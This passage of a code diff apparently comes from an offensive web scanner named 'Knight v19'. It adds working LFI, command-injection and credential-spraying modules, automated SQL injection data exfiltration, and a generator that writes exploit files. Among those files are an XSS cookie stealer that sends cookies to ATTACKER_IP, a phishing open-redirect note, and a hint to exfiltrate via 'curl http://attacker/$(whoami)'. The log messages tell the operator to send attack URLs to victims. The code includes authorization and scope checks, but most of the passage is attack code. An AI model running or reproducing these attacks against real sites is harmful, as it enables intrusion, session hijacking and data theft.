+        for param in qs:
+            original = qs[param][0] if qs[param] else ""
+            for label, payload in LFI_PAYLOADS:
+                qs_copy = dict(qs)
+                qs_copy[param] = [payload]
+                test_url = urlunparse(parsed._replace(query=urlencode(qs_copy, doseq=True)))
+                resp = get_following_redirects(test_url)
+                if not resp:
+                    continue
+                found = [m for m in LFI_SUCCESS_MARKERS if m in resp.text]
+                if found or ("root" in resp.text and ":" in resp.text and "/bin/" in resp.text):
+                    findings.append({
+                        "type": "Local File Inclusion",
+                        "confidence": "CONFIRMED" if found else "SUSPECTED",
+                        "url": test_url,
+                        "proof": f"Payload '{label}' returned file contents. Markers: {found[:3]}",
+                        "repro": f"curl -s '{test_url}'",
+                        "img": None,
+                    })
+                    log_off.info(f"[!] LFI found: {test_url} with {label}")
+                    break
+    return findings
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# OFF.6 — Credential Spraying (uses post() with rate limiting)
+# ──────────────────────────────────────────────────────────────────────────────
+
+COMMON_CREDENTIALS = [
+    ("admin", "admin"), ("admin", "password"), ("admin", "1234"), ("admin", "admin123"),
+    ("admin", "Passw0rd"), ("admin", "Admin@123"), ("admin", "root"), ("admin", ""),
+    ("root", "root"), ("root", "toor"), ("root", "password"),
+    ("test", "test"), ("test", "password"), ("test", "1234"),
+    ("guest", "guest"), ("guest", "password"),
+    ("administrator", "administrator"), ("administrator", "password"),
+    ("demo", "demo"), ("demo", "demo1234"),
+    ("tomcat", "tomcat"), ("manager", "manager"),
+    ("pi", "raspberry"), ("ubuntu", "ubuntu"),
+    ("support", "support"), ("info", "info"),
+]
+
+def spray_credentials(auth_endpoints: list[tuple]) -> list[dict]:
+    findings = []
+    for url, _ in auth_endpoints:
+        for username, password in COMMON_CREDENTIALS:
+            r = post(url, data={
+                "username": username, "password": password,
+                "user": username, "pass": password,
+                "email": username, "passwd": password,
+            })
+            if not r:
+                continue
+            body = r.text.lower() if hasattr(r, 'text') else ""
+            success = any(w in body for w in ["dashboard", "welcome", "logged in", "redirecting", "logout"])
+            failure = any(w in body for w in ["invalid", "incorrect", "wrong", "failed"])
+            if (r.status_code in (301, 302, 303, 307, 308) or success) and not failure:
+                findings.append({
+                    "type": "Weak Credentials / Default Login",
+                    "status": "DETECTED",
+                    "confidence": "SUSPECTED — verify manually",
+                    "url": url,
+                    "proof": f"A common credential pair produced a response consistent with successful authentication (HTTP {r.status_code}); credentials redacted.",
+                    "repro": f"manual verification required for {url}; credential pair redacted",
+                    "img": None,
+                })
+                log_off.info(f"[!] Weak credentials: {username}:{password} @ {url}")
+                break
+            time.sleep(random.uniform(0.5, 1.5))
+    return findings
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# OFF.7 — Command Injection Scanner (unchanged, already solid)
+# ──────────────────────────────────────────────────────────────────────────────
+
+UNIX_CMD_PAYLOADS = [
+    ("semicolon",   f"; sleep {SLEEP_SECONDS}"),
+    ("pipe",        f"| sleep {SLEEP_SECONDS}"),
+    ("AND",         f"&& sleep {SLEEP_SECONDS}"),
+    ("OR",          f"|| sleep {SLEEP_SECONDS}"),
+    ("backtick",    f"`sleep {SLEEP_SECONDS}`"),
+    ("subshell",    f"$(sleep {SLEEP_SECONDS})"),
+    ("newline",     f"\\nsleep {SLEEP_SECONDS}"),
+]
+
+WIN_CMD_PAYLOADS = [
+    ("semicolon",        f"; timeout {SLEEP_SECONDS}"),
+    ("pipe",             f"| timeout {SLEEP_SECONDS}"),
+    ("AND",              f"&& timeout {SLEEP_SECONDS}"),
+    ("ping loop",        f"& ping -n {SLEEP_SECONDS + 1} 127.0.0.1 > nul"),
+    ("powershell sleep", f"; powershell Start-Sleep -Seconds {SLEEP_SECONDS}"),
+    ("newline",          f"\\ntimeout {SLEEP_SECONDS}"),
+]
+
+def _detect_os(url: str) -> str:
+    try:
+        r = httpx.get(url, timeout=HTTP_TIMEOUT, verify=False)
+        server = r.headers.get("Server", "").lower()
+        if any(x in server for x in ["microsoft-iis", "windows", "asp.net"]):
+            return "windows"
+        body = (r.text[:500] if hasattr(r, 'text') else "").lower()
+        if any(x in body for x in ["asp.net", "iis"]):
+            return "windows"
+    except:
+        pass
+    return "unix"
+
+def _median_mad(values: list[float]) -> tuple[float, float]:
+    if not values:
+        return 0.0, 0.0
+    med = statistics.median(values)
+    deviations = [abs(v - med) for v in values]
+    return med, statistics.median(deviations) if deviations else 0.0
+
+def _confirm_cmd_injection(url: str, param: str, original: str,
+                           cmd_label: str, cmd_payload: str) -> dict | None:
+    baseline_times = []
+    for _ in range(TIME_TRIALS):
+        t0 = time.monotonic()
+        r = get(url)
+        if r: baseline_times.append(time.monotonic() - t0)
+    if len(baseline_times) < TIME_TRIALS:
+        return None
+    baseline_med, baseline_mad = _median_mad(baseline_times)
+    parsed = urlparse(url)
+    qs = parse_qs(parsed.query)
+    control_value = "' AND '1'='1"
+    qs_copy = dict(qs)
+    qs_copy[param] = [original + control_value]
+    control_url = urlunparse(parsed._replace(query=urlencode(qs_copy, doseq=True)))
+    control_times = []
+    for _ in range(TIME_TRIALS):
+        t0 = time.monotonic()
+        r = get(control_url)
+        if r: control_times.append(time.monotonic() - t0)
+    if len(control_times) < TIME_TRIALS:
+        return None
+    control_med, control_mad = _median_mad(control_times)
+    qs_copy = dict(qs)
+    qs_copy[param] = [original + cmd_payload]
+    test_url = urlunparse(parsed._replace(query=urlencode(qs_copy, doseq=True)))
+    test_times = []
+    for _ in range(TIME_TRIALS):
+        t0 = time.monotonic()
+        r = get(test_url)
+        if r: test_times.append(time.monotonic() - t0)
+    if len(test_times) < TIME_TRIALS:
+        return None
+    test_med, test_mad = _median_mad(test_times)
+    delta = test_med - control_med
+    baseline_jitter = max(baseline_mad, control_mad, 0.05)
+    separated = delta >= max(SLEEP_SECONDS * 0.70, baseline_jitter * 4.0)
+    close_to_expected = abs(delta - SLEEP_SECONDS) <= max(TIME_TOLERANCE, baseline_jitter * 3.0)
+    if separated and close_to_expected:
+        return {
+            "type": "Command Injection (time-based blind)",
+            "status": "CONFIRMED",
+            "confidence": f"CONFIRMED — {cmd_label} sleep-delay verified across {TIME_TRIALS} trials",
+            "url": test_url,
+            "proof": f"Injecting '{cmd_payload}' added {delta:.2f}s median delay; baseline MAD={baseline_mad:.3f}s, control MAD={control_mad:.3f}s, test MAD={test_mad:.3f}s.",
+            "repro": f"time curl -s '{test_url}'",
+            "img": None,
+        }
+    return None
+
+def scan_cmd_injection(param_urls: list[str], base_urls: list[str]) -> list[dict]:
+    findings = []
+    for url in param_urls[:100]:
+        parsed = urlparse(url)
+        qs = parse_qs(parsed.query)
+        if not qs:
+            continue
+        os_type = _detect_os(url)
+        payloads = WIN_CMD_PAYLOADS if os_type == "windows" else UNIX_CMD_PAYLOADS
+        if os_type != "windows":
+            payloads = payloads + WIN_CMD_PAYLOADS
+        for param in qs:
+            original = qs[param][0] if qs[param] else ""
+            if not original:
+                continue
+            for cmd_label, cmd_payload in payloads:
+                confirmed = _confirm_cmd_injection(url, param, original, cmd_label, cmd_payload)
+                if confirmed:
+                    findings.append(confirmed)
+                    log_off.info(f"CONFIRMED CMD injection: {confirmed['url']} via {cmd_label}")
+                    break
+    return findings
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# OFF.8 — Auto Payload Generator (fixed command injection script)
+# ──────────────────────────────────────────────────────────────────────────────
+
+def generate_exploit_payloads(findings: list[dict], scan_target: str, evidence_dir: Path) -> list[dict]:
+    exploits = []
+    payloads_dir = evidence_dir / "exploits"
+    payloads_dir.mkdir(exist_ok=True)
+
+    for f in findings:
+        if not finding_is_confirmed(f):
+            continue
+        ftype = f["type"]
+
+        if "SQL Injection" in ftype:
+            code = f'''#!/usr/bin/env python3
+# Knight GENERATED SQLI EXPLOIT -- {scan_target}
+# URL: {f["url"]}
+
+import httpx, time
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+URL = "{f["url"]}"
+PARAM = "{f.get("parameter", list(parse_qs(urlparse(f["url"]).query).keys())[0] if parse_qs(urlparse(f["url"]).query) else "")}"
+
+def inject(condition):
+    parsed = urlparse(URL)
+    qs = parse_qs(parsed.query)
+    param = PARAM
+    payload = "' OR IF((" + condition + "), SLEEP(5), 0)-- -"
+    if param not in qs:
+        return False
+    qs[param] = [payload]
+        test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+        t0 = time.monotonic()
+        try:
+            r = httpx.get(test_url, timeout=10, verify=False)
+            if time.monotonic() - t0 > 3:
+                return True
+        except:
+            pass
+    return False
+
+if __name__ == "__main__":
+    print("[*] Testing SQLi...")
+    print(f"[+] Injectable: {{inject('1=1')}}")
+    print(f"[+] Version has 5: {{inject('SUBSTRING(@@version,1,1)=5')}}")
+'''
+            fname = f"sqli_exploit_{int(time.time())}.py"
+            with open(payloads_dir / fname, "w") as fh:
+                fh.write(code)
+            os.chmod(payloads_dir / fname, 0o755)
+
+        elif "Reflected XSS" in ftype:
+            code = f'''## XSS Exploit: {scan_target}
+### Cookie Stealer Payload
+<script>
+new Image().src="http://ATTACKER_IP:8081/steal?c="+encodeURIComponent(document.cookie)+"&loc="+encodeURIComponent(document.URL);
+</script>
+
+### Attack URL
+{f["url"]}
+'''
+            fname = f"xss_exploit_{int(time.time())}.md"
+            with open(payloads_dir / fname, "w") as fh:
+                fh.write(code)
+
+        elif "Open Redirect" in ftype:
+            code = f'''## Open Redirect Exploit
+### Phishing URL (send to victim):
+{f["url"]}
+
+Chain with a cloned login page to capture credentials.
+'''
+            fname = f"openredirect_exploit_{int(time.time())}.md"
+            with open(payloads_dir / fname, "w") as fh:
+                fh.write(code)
+
+        elif "Command Injection" in ftype:
+            code = f'''#!/usr/bin/env python3
+# Knight GENERATED CMD INJECTION EXPLOIT – time‑based blind
+# Target: {scan_target}
+# URL: {f["url"]}
+# This script confirms the injection via time delay.
+
+import httpx, time
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+URL = "{f["url"]}"
+SLEEP_SEC = 5
+
+def inject(cmd, sleep_sec=SLEEP_SEC):
+    parsed = urlparse(URL)
+    qs = parse_qs(parsed.query)
+    for param in qs:
+        payload = f"; sleep {{sleep_sec}}"
+        qs[param] = [payload]
+        test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
+        t0 = time.monotonic()
+        try:
+            r = httpx.get(test_url, timeout=sleep_sec+5, verify=False)
+            return time.monotonic() - t0 >= sleep_sec * 0.7
+        except:
+            return False
+    return False
+
+if __name__ == "__main__":
+    print("[*] Testing command injection...")
+    if inject("sleep 5"):
+        print("[+] Command injection CONFIRMED (time delay detected).")
+        print("[!] To exfiltrate output, replace 'sleep 5' with your own OOB payload")
+        print("[!] e.g. nslookup $(whoami).attacker.com or curl http://attacker/$(whoami)")
+    else:
+        print("[-] No time delay detected – injection may not work with this payload.")
+'''
+            fname = f"cmd_injection_exploit_{int(time.time())}.py"
+            with open(payloads_dir / fname, "w") as fh:
+                fh.write(code)
+            os.chmod(payloads_dir / fname, 0o755)
+
+    files = list(payloads_dir.iterdir())
+    if files:
+        idx = "# Generated Exploit Payloads\n\n" + "".join(f"- [{f.name}]({f.name})\n" for f in files)
+        with open(payloads_dir / "INDEX.md", "w") as fh:
+            fh.write(idx)
+        exploits.append({
+            "type": f"Exploit Payloads Generated — {len(files)} files",
+            "confidence": "INFORMATIONAL",
+            "url": str(payloads_dir),
+            "proof": f"{len(files)} exploit payload files in {payloads_dir}/",
+            "repro": f"ls -la {payloads_dir}/",
+            "img": None,
+        })
+    return exploits
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# OFFENSIVE ENGINE — Master Controller
+# ──────────────────────────────────────────────────────────────────────────────
+
+# Lab-only startup XSS capture listener. It is intentionally restricted to
+# loopback targets so startup capture cannot be accidentally enabled against
+# a remote host.
+STARTUP_XSS_CAPTURE = None
+
+
+class OffensiveEngine:
+    def __init__(self, target: str, base_urls: list[str], param_urls: list[str],
+                 alive_hosts: list[dict], findings: list[dict], turbo: bool = False):
+        self.target = target
+        self.base_urls = base_urls
+        self.param_urls = param_urls
+        self.alive_hosts = alive_hosts
+        self.findings = findings
+        self.turbo = turbo
+
+    def run_all(self) -> list[dict]:
+        new_findings = []
+        log_off.info("\n" + "=" * 70)
+        log_off.info("  OFFENSIVE MODULE ACTIVATED")
+        log_off.info("=" * 70)
+
+        # OFF.1 SQLi Auto-Exfil
+        # Only deterministic CONFIRMED findings may enter the exploitation stage.
+        sqli_findings = [
+            f for f in normalize_finding_statuses(self.findings)
+            if "SQL Injection" in f.get("type", "") and finding_is_confirmed(f)
+        ]
+        for sqli in sqli_findings[:3]:
+            url = sqli["url"]
+            parsed = urlparse(url)
+            qs = parse_qs(parsed.query)
+            if qs:
+                param = list(qs.keys())[0]
+                engine = "MySQL"
+                if "pg_sleep" in sqli.get("proof", ""):
+                    engine = "PostgreSQL"
+                elif "WAITFOR" in sqli.get("proof", ""):
+                    engine = "MSSQL"
+                log_off.info("[*] Starting SQLi data exfiltration...")
+                exfil = SQLiExfiltrator(url, param, technique="time", engine=engine)
+                try:
+                    exfil_results = exfil.run_full_exfil()
+                    script = exfil.generate_dump_script(exfil_results)
+                    script_path = EVIDENCE_DIR / f"sqli_dump_{re.sub(r'[^a-z0-9]', '_', self.target)}_{int(time.time())}.py"
+                    with open(script_path, "w") as f:
+                        f.write(script)
+                    os.chmod(script_path, 0o755)
+                    new_findings.append({
+                        "type": "SQL Injection — Data Exfiltrated",
+                        "status": "EXTRACTED",
+                        "confidence": "CONFIRMED — database contents extracted",
+                        "url": url,
+                        "proof": f"Extracted: version={exfil_results.get('version','?')}, user={exfil_results.get('user','?')}, database={exfil_results.get('database','?')}, tables={exfil_results.get('tables',[])}",
+                        "repro": f"python3 {script_path}",
+                        "img": None,
+                    })
+                    log_off.info(f"[✔] SQLi exfil complete. Dump script: {script_path}")
+                except Exception as e:
+                    log_off.warning(f"SQLi exfil failed: {e}")
+
+        # OFF.2 XSS Cookie Capture
+        xss_findings = [
+            f for f in normalize_finding_statuses(self.findings)
+            if "Reflected XSS" in f.get("type", "") and finding_is_confirmed(f)
+        ]
+        if xss_findings:
+            capture = STARTUP_XSS_CAPTURE or XSSCookieCapture()
+            if STARTUP_XSS_CAPTURE is not None:
+                log_off.info("[*] Using startup XSS cookie-capture listener...")
+                cb_url = capture.callback_url
+            else:
+                log_off.info("[*] Starting XSS cookie capture listener...")
+                cb_url = capture.start()
+            if cb_url:
+                for xss in xss_findings[:5]:
+                    parsed = urlparse(xss["url"])
+                    for param in parse_qs(parsed.query):
+                        attack_url = capture.generate_attack_url(xss["url"], param)
+                        if attack_url:
+                            log_off.info(f"[!] XSS attack URL (send to victim): {attack_url}")
+                log_off.info("[*] Listener will run for 30 seconds. Send attack URL to a victim.")
+                time.sleep(30)
+                captured = capture.get_captured()
+                for c in captured:
+                    new_findings.append({
+                        "type": "XSS — Session Cookie Captured",
+                        "status": "EXTRACTED",
+                        "confidence": "CONFIRMED — cookie capture demonstrated; value redacted",
+                        "url": c.get("source_url", xss_findings[0]["url"]),
+                        "proof": f"Cookie capture demonstrated. Redacted value: {c.get('cookie','?')}",
+                        "repro": "redacted; do not replay captured session material",
+                        "img": None,
+                    })
+                capture.stop()
+
+        # OFF.3 Auth Bypass + Cred Spraying
+        if not self.turbo:
+            log_off.info("[*] Scanning for auth endpoints and testing bypasses...")
+            auth_endpoints = discover_auth_endpoints(self.base_urls)
+            if auth_endpoints:
+                new_findings.extend(test_auth_bypass(auth_endpoints))
+                new_findings.extend(spray_credentials(auth_endpoints))
+
+        # OFF.4 Directory Bruteforce
+        log_off.info("[*] Running directory/endpoint bruteforce...")
+        new_findings.extend(dir_bruteforce(self.base_urls, self.turbo))
+
+        # OFF.5 LFI/RFI
+        if not self.turbo and self.param_urls:
+            log_off.info("[*] Scanning for LFI/RFI...")
+            new_findings.extend(scan_lfi_rfi(self.param_urls))
+
+        # OFF.7 Command Injection
+        if self.param_urls:
+            log_off.info("[*] Scanning for OS command injection...")
+            new_findings.extend(scan_cmd_injection(self.param_urls, self.base_urls))
+
+        # OFF.8 Payload Generator
+        log_off.info("[*] Generating exploit payloads...")
+        new_findings.extend(generate_exploit_payloads(self.findings + new_findings, self.target, EVIDENCE_DIR))
+
+        log_off.info(f"[✔] Offensive module complete: {len(new_findings)} new findings\n")
+        return new_findings
+
+
+# ==============================================================================
+# MASTER CONTROL
+# ==============================================================================
+
+log_buraq = get_logger("Knight")
+
+def _parse_header(s):
+    if not s or ":" not in s:
+        return {}
+    k, _, v = s.partition(":")
+    return {k.strip(): v.strip()}
+
+def _neural_heartbeat(stop_event, label):
+    glyphs = ["▰▱▱▱▱▱▱", "▰▰▱▱▱▱▱", "▰▰▰▱▱▱▱", "▰▰▰▰▱▱▱", "▰▰▰▰▰▱▱", "▰▰▰▰▰▰▱", "▰▰▰▰▰▰▰"]
+    i = 0
+    while not stop_event.is_set():
+        sys.stdout.write(f"\r\033[94m{glyphs[i % 7]} [ {label} ] ... \033[0m")
+        sys.stdout.flush()
+        time.sleep(0.15)
+        i += 1
+    sys.stdout.write("\r" + " " * 60 + "\r")
+
+def _with_heartbeat(label, fn, *args, **kwargs):
+    stop_event = threading.Event()
+    t = threading.Thread(target=_neural_heartbeat, args=(stop_event, label), daemon=True)
+    t.start()
+    try:
+        return fn(*args, **kwargs)
+    finally:
+        stop_event.set()
+        t.join(timeout=1)
+
+def run_nuclei(hosts, turbo):
+    """Run Nuclei with explicit diagnostics and a bounded process timeout."""
+    if not hosts:
+        log_buraq.info("Nuclei skipped: no confirmed live targets.")
+        return []
+
+    targets = list(dict.fromkeys(h for h in hosts if h))
+    if not targets:
+        log_buraq.info("Nuclei skipped: target list is empty.")
+        return []
+
+    target_file = BASE_DIR / "ghost_targets.txt"
+    scan_log = BASE_DIR / "hardened_scan.txt"
+    target_file.write_text("\n".join(targets) + "\n")
+
+    cmd = [
+        "nuclei", "-l", str(target_file), "-o", str(scan_log),
+        "-timeout", str(NUCLEI_TIMEOUT),
+        "-c", str(NUCLEI_CONCURRENCY),
+        "-mhe", "20", "-silent",
+    ]
+    if turbo:
+        cmd += ["-severity", "critical,high"]
+
+    # Propagate optional authenticated headers/cookies to Nuclei.
+    if _AUTH_HEADERS:
+        for key, value in _AUTH_HEADERS.items():
+            cmd += ["-H", f"{key}: {value}"]
+    if _AUTH_COOKIES:
+        cmd += ["-H", f"Cookie: {_cookie_header()}"]
+
+
+    log_buraq.info(
+        "Nuclei config: targets=%d request_timeout=%ss concurrency=%s "
+        "process_timeout=%ss mode=%s",
+        len(targets), NUCLEI_TIMEOUT, NUCLEI_CONCURRENCY,
+        NUCLEI_PROCESS_TIMEOUT, "turbo" if turbo else "deep",
+    )
+    log_buraq.info("Nuclei target sample: %s", ", ".join(targets[:5]))
+    safe_cmd = list(cmd)
+    redacted_cmd = []
+    i = 0
+    while i < len(safe_cmd):
+        part = safe_cmd[i]
+        if part == "-H" and i + 1 < len(safe_cmd):
+            header_part = safe_cmd[i + 1]
+            header_name = header_part.split(":", 1)[0]
+            redacted_cmd.extend(["-H", f"{header_name}: <REDACTED>"])
+            i += 2
+            continue
+        redacted_cmd.append(part)
+        i += 1
+    log_buraq.info("Nuclei command: %s", " ".join(redacted_cmd))
+
+    started = time.monotonic()
+    stdout_text = ""
+    stderr_text = ""
+
+    try:
+        proc = subprocess.Popen(
+            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+        )
+        ResourceManager.register_process(proc)
+
+        try:
+            stdout_text, stderr_text = proc.communicate(
+                timeout=NUCLEI_PROCESS_TIMEOUT
+            )
+        except subprocess.TimeoutExpired as exc:
+            elapsed = time.monotonic() - started
+            stdout_text = exc.stdout.decode(errors="replace") if isinstance(exc.stdout, bytes) else (exc.stdout or "")
+            stderr_text = exc.stderr.decode(errors="replace") if isinstance(exc.stderr, bytes) else (exc.stderr or "")
+
+            try:
+                proc.kill()
+            except Exception:
+                pass
+
+            try:
+                extra_out, extra_err = proc.communicate(timeout=5)
+                stdout_text += extra_out or ""
+                stderr_text += extra_err or ""
+            except Exception:
+                pass
+
+            partial_count = 0
+            if scan_log.exists():
+                try:
+                    partial_count = sum(
+                        1 for line in scan_log.read_text(errors="replace").splitlines()
+                        if line.strip()
+                    )
+                except Exception:
+                    pass
+
+            log_buraq.warning(
+                "Nuclei process timeout after %.1fs; partial results=%d",
+                elapsed, partial_count
+            )
+            if stderr_text.strip():
+                log_buraq.warning(
+                    "Nuclei stderr (last 4000 chars): %s", stderr_text[-4000:]
+                )
+            if stdout_text.strip():
+                log_buraq.info(
+                    "Nuclei stdout (last 2000 chars): %s", stdout_text[-2000:]
+                )
+            return []
+
+        finally:
+            if proc in ResourceManager._processes:
+                ResourceManager._processes.remove(proc)
+
+    except FileNotFoundError:
+        log_buraq.error("Nuclei not found on PATH — skipping CVE/misconfig scan.")
+        return []
+    except Exception as e:
+        log_buraq.error("Nuclei launch failed: %s", e)
+        return []
+
+    elapsed = time.monotonic() - started
+    if stderr_text.strip():
+        log_buraq.info(
+            "Nuclei stderr (last 4000 chars): %s", stderr_text[-4000:]
+        )
+    if stdout_text.strip():
+        log_buraq.info(
+            "Nuclei stdout (last 2000 chars): %s", stdout_text[-2000:]
+        )
+
+    result_lines = []
+    if scan_log.exists():
+        try:
+            result_lines = [
+                line.strip()
+                for line in scan_log.read_text(errors="replace").splitlines()
+                if line.strip()
+            ]
+        except Exception as e:
+            log_buraq.warning("Could not read Nuclei output: %s", e)
+
+    log_buraq.info(
+        "Nuclei finished: elapsed=%.1fs results=%d",
+        elapsed, len(result_lines)
+    )
+    return result_lines[:20]
+
+def buraq_master(target, turbo, endpoint_template, candidate_ids, scope_file=None,
+                  session_a=None, session_b=None, confirmed_resource_id=None,
+                  skip_injection=False, skip_js_secrets=False,
+                  offensive=False, verify_secrets=False,
+                  auth_check_url=None, auth_check_marker=None):
+
+    if not require_authorization(target):
+        sys.exit(1)
+
+    print(f"\033[94m[◈] Knight {VERSION} ENGAGED: {target}\033[0m")
+    print(
+        f"\033[93m[!] MODE: "
+        f"{'TURBO (critical/high only)' if turbo else 'DEEP (full spectrum)'}\033[0m"
+    )
+    print(
+        f"\033[96m[!] AUTH SESSION: "
+        f"{'ENABLED' if _AUTH_ENABLED else 'DISABLED'}\033[0m\n"
+    )
+
+    parsed_target = urlparse(target if "://" in target else f"https://{target}")
+    target_hostname = (parsed_target.hostname or "").lower()
+    target_hostport = parsed_target.netloc or target_hostname
+    target_base_url = f"{parsed_target.scheme}://{parsed_target.netloc}"
+
+    # Start the cookie-capture listener immediately for the local lab.
+    # Remote targets retain the existing post-XSS listener behavior.
+    global STARTUP_XSS_CAPTURE
+    STARTUP_XSS_CAPTURE = None
+    if offensive and target_hostname in {"127.0.0.1", "localhost", "::1"}:
+        STARTUP_XSS_CAPTURE = XSSCookieCapture()
+        startup_cb = STARTUP_XSS_CAPTURE.start()
+        if startup_cb:
+            log_off.info("[LAB] XSS cookie-capture listener active from startup: %s", startup_cb)
+        else:
+            log_off.warning("[LAB] Could not start XSS cookie-capture listener at startup")
+
+    scope_include, scope_exclude = load_scope(scope_file)
+    if not scope_file:
+        log_scope.warning(
+            "No scope file supplied; only the explicitly confirmed target will be scanned."
+        )
+        scope_include = [target_hostport]
+
+    if not in_scope(target_hostport, scope_include, scope_exclude):
+        log_scope.error(f"Target {target_hostport} is outside the supplied scope.")
+        raise SystemExit(1)
+
+    stage_times = {}
+
+    def timed(label, fn, *fn_args, **fn_kwargs):
+        started = time.monotonic()
+        result = _with_heartbeat(label, fn, *fn_args, **fn_kwargs)
+        elapsed = time.monotonic() - started
+        stage_times[label] = elapsed
+        log_buraq.info("TIMING: %s = %.1fs", label, elapsed)
+        return result
+
+    auth_result = None
+    if _AUTH_ENABLED:
+        auth_result = verify_authenticated_session(
+            target_hostname or target_hostport,
+            check_url=auth_check_url,
+            marker=auth_check_marker,
+        )
+        if not auth_result.get("passed"):
+            log_net.warning(
+                "Authenticated session is INCONCLUSIVE; continuing with the supplied session."
+            )
+
+    # 1. Recon
+    alive_hosts = timed(
+        "GHOST HUNTER: RECON",
+        ghost_hunter,
+        target,
+        None,
+        scope_include,
+        scope_exclude,
+    )
+    host_names = [h["host"] for h in alive_hosts]
+    base_urls = [h["url"] for h in alive_hosts]
+
+    if not alive_hosts:
+        print(
+            f"\033[91m[!] No hosts confirmed reachable for {target}. "
+            f"Skipping live crawl and active scanners.\033[0m"
+        )
+
+    # 2. Crawl
+    all_urls = []
+    for base in base_urls:
+        parsed_base = urlparse(base)
+        hostname = parsed_base.hostname
+        if not hostname:
+            continue
+        started = time.monotonic()
+        discovered = _with_heartbeat(
+            f"CRAWLING {base}",
+            discover_urls,
+            base,
+        )
+        elapsed = time.monotonic() - started
+        stage_times[f"CRAWL {hostname}"] = elapsed
+        log_buraq.info("TIMING: CRAWL %s = %.1fs", hostname, elapsed)
+        all_urls.extend(discovered)
+
+    param_urls = urls_with_params(all_urls)
+    js_urls = find_js_urls(all_urls)
+    log_buraq.info(
+        f"{len(param_urls)} parameterized URL(s), {len(js_urls)} JS file(s) discovered"
+    )
+    findings = []
+
+    # 3. JS secrets
+    if not skip_js_secrets and js_urls:
+        findings.extend(
+            timed(
+                "SCANNING JS FOR SECRETS",
+                scan_js_for_secrets,
+                js_urls,
+                30,
+                verify_secrets,
+            )
+        )
+
+    # 4. Injection scanners
+    if not skip_injection and param_urls:
+        def _scan_injections():
+            out = []
+            for u in param_urls[:200]:
+                out.extend(scan_reflected_xss(u))
+                out.extend(scan_sqli(u))
+                out.extend(scan_open_redirect(u))
+            return out
+
+        findings.extend(
+            timed(
+                "SCANNING FOR XSS / SQLI / OPEN REDIRECT",
+                _scan_injections,
+            )
+        )
+
+    # 5. Information disclosure is independent of query parameters.
+    # Scan discovered non-JS resources so endpoints such as /debug are
+    # not lost merely because they have no query string.
+    disclosure_started = time.monotonic()
+    disclosure_candidates = [
+        u for u in all_urls
+        if not urlparse(u).path.lower().endswith(".js")
+    ][:200]
+    for u in disclosure_candidates:
+        findings.extend(scan_information_disclosure(u))
+    stage_times["INFORMATION DISCLOSURE"] = time.monotonic() - disclosure_started
+    log_buraq.info(
+        "TIMING: INFORMATION DISCLOSURE = %.1fs",
+        stage_times["INFORMATION DISCLOSURE"],
+    )
+
+    # 6. IDOR
+    idor_started = time.monotonic()
+    if session_a and session_b and confirmed_resource_id:
+        for base in base_urls:
+            result = confirmed_idor_check(
+                base,
+                endpoint_template,
+                confirmed_resource_id,
+                session_a,
+                session_b,
+            )
+            if result:
+                findings.append(result)
+    else:
+        for base in base_urls:
+            findings.extend(
+                suspected_idor_scan(
+                    base,
+                    endpoint_template,
+                    candidate_ids,
+                )
+            )
+    stage_times["IDOR"] = time.monotonic() - idor_started
+    log_buraq.info("TIMING: IDOR = %.1fs", stage_times["IDOR"])
+
+    # 7. Nuclei
+    nuclei_started = time.monotonic()
+    nuclei_raw = _with_heartbeat(
+        "RUNNING NUCLEI",
+        run_nuclei,
+        host_names,
+        turbo,
+    )
+    stage_times["RUNNING NUCLEI"] = time.monotonic() - nuclei_started
+    log_buraq.info(
+        "TIMING: RUNNING NUCLEI = %.1fs",
+        stage_times["RUNNING NUCLEI"],
+    )
+
+    # 8. Offensive modules
+    offensive_findings = []
+    if offensive:
+        started = time.monotonic()
+        log_buraq.info("\n" + "!" * 70)
+        log_buraq.info("  OFFENSIVE MODULE ENGAGED")
+        log_buraq.info("!" * 70)
+        engine = OffensiveEngine(
+            target,
+            base_urls,
+            param_urls,
+            alive_hosts,
+            findings,
+            turbo,
+        )
+        offensive_findings = engine.run_all()
+        findings.extend(offensive_findings)
+        stage_times["OFFENSIVE MODULES"] = time.monotonic() - started
+        log_buraq.info(
+            "TIMING: OFFENSIVE MODULES = %.1fs",
+            stage_times["OFFENSIVE MODULES"],
+        )
+
+    # 8. Brain + Scribe
+    started = time.monotonic()
+    doctrine = load_signatures()
+    findings = dedupe_and_triage(findings, doctrine)
+    brain_ctx = brain_context_for_prompt(doctrine)
+    ai_proof = _with_heartbeat(
+        "GENERATING AI SUMMARY",
+        generate_ai_summary,
+        target,
+        findings,
+        nuclei_raw,
+        brain_ctx,
+    )
+    report_path = generate_report(
+        target,
+        ai_proof,
+        findings,
+        doctrine,
+    )
+    stage_times["BRAIN + SCRIBE"] = time.monotonic() - started
+    log_buraq.info(
+        "TIMING: BRAIN + SCRIBE = %.1fs",
+        stage_times["BRAIN + SCRIBE"],
+    )
+
+    log_buraq.info("TIMING SUMMARY:")
+    for name, elapsed in stage_times.items():
+        log_buraq.info("  %-32s %.1fs", name, elapsed)
+
+    print(f"\n\033[92m[✔] REPORT SEALED: {report_path}\033[0m")
+    print(
+        f"    Hosts alive: {len(alive_hosts)} | URLs crawled: {len(all_urls)} | "
+        f"Parameterized: {len(param_urls)} | Findings: {len(findings)}"
+    )
+    if auth_result is not None:
+        print(
+            f"    Auth session: {auth_result.get('status', 'INCONCLUSIVE')}"
+        )
+    if findings:
+        status_counts = {
+            st: sum(1 for f in findings if f.get("status") == st)
+            for st in FINDING_STATUSES
+        }
+        print(
+            "    Status: " +
+            " | ".join(f"{k}: {v}" for k, v in status_counts.items())
+        )
+    if offensive_findings:
+        print(f"    Offensive findings: {len(offensive_findings)}")
+
+def main():
+    parser = argparse.ArgumentParser(description="KNIGHT v19 - Autonomous Recon & Vulnerability Assessment")
+    parser.add_argument("target", nargs="?", help="Target domain, e.g. example.com")
+    parser.add_argument("--nuclei-process-timeout", type=float,
+                        help="Maximum Nuclei wall-clock time in seconds")
+    parser.add_argument("--turbo", action="store_true", help="Critical/high severity only, skip mode prompt")
+    parser.add_argument("--scope-file", help="Plain text scope file (wildcards + ! exclusions)")
